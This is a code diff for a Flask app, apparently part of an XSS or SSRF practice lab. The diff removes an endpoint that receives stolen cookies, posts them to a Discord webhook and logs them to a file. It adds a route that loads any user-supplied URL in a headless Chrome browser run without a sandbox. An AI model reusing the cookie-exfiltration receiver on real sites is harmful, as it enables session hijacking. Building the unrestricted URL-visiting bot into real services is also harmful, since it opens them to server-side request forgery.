@@ -1,8 +1,11 @@
 from flask import Blueprint, render_template, request, redirect, session, url_for, jsonify, flash
 from flask.sessions import SecureCookieSessionInterface
 from flask import current_app
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
 from sqlalchemy import text
 from datetime import datetime, timedelta
+from time import sleep
 from . import db  # db 인스턴스 import
 import os
 import requests
@@ -310,25 +313,36 @@ def search_user():
         query=query
     )
 
-WEBHOOK_URL = ''
+@main.route('/soap', methods = ["GET", "POST"])
+def import_image():
+    if request.method == "POST":
+        URL = request.form.get("URL")
+        if not URL:
+            return render_template("soap.html", message="URL을 입력하십시오.")
+        else:
+            service = Service(executable_path="/chromedriver-linux64/chromedriver")
+            options = webdriver.ChromeOptions()
+            for arg in [
+                "headless",
+                "window-size=1920x1080",
+                "disable-gpu",
+                "no-sandbox",
+                "disable-dev-shm-usage",
+            ]:
+                options.add_argument(arg)
 
-def send_to_discord(message):
-    data = {
-        "content": f" 탈취한 쿠키: `{message}`"
-    }
-    requests.post(WEBHOOK_URL, json=data)
+            driver = webdriver.Chrome(service=service, options=options)
+            driver.set_page_load_timeout(3)
 
-def save_to_file(message):
-    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    with open("cookie.txt", "a") as f:
-        f.write(f"[{now}] {message}\n")
+            try:
+                driver.get(URL)
+                sleep(1)
+            except Exception as e:
+                return render_template("soap.html", message=f"접속 실패: {e}")
+            finally:
+                driver.quit()
 
-@main.route('/soap')
-def log_cookie():
-    cookie = request.args.get('cookie')
-    if cookie:
-        send_to_discord(cookie)
-        save_to_file(cookie)
-        return 'Cookie sent and saved', 200
-    return 'No Cookie exists', 400
+            return render_template("soap.html", message="이미지를 성공적으로 불러왔습니다.")
+    else:
+        return render_template("soap.html")
 
